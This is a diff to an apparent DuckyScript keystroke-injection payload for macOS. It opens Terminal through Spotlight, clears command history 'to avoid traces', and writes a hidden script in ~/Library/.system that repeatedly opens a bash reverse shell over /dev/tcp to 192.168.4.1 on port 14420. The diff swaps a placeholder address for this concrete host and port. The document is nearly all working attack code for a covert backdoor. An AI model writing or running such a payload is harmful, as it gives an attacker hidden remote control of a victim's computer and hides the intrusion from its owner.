@@ -13,7 +13,9 @@ REM [Delay to ensure system readiness]
 DELAY 5000
 
 REM [Open Terminal]
-CTRL t
+GUI SPACE
+STRING terminal
+ENTER
 DELAY 400
 
 REM [Clear command history to avoid traces]
@@ -35,7 +37,7 @@ ENTER
 DELAY 100
 
 REM [Create reverse shell script]
-STRING printf '#!/bin/bash\nwhile true; do\n\tping -c 5 0.0.0.0\n\tif [ \$? -eq 0 ]; then\n\t\tbash -c "exec 3<>/dev/tcp/0.0.0.0/4444; ~/Library/.system/sys.sh <&3 >&3 2>&3"\n\tfi\n\tsleep 5\ndone\n' > ~/Library/.system/systemBus.sh
+STRING printf '#!/bin/bash\nwhile true; do\n\tping -c 5 192.168.4.1\n\tif [ \$? -eq 0 ]; then\n\t\tbash -c "exec 3<>/dev/tcp/192.168.4.1/14420; ~/Library/.system/sys.sh <&3 >&3 2>&3"\n\tfi\n\tsleep 5\ndone\n' > ~/Library/.system/systemBus.sh
 ENTER
 DELAY 100
 STRING chmod +x ~/Library/.system/systemBus.sh
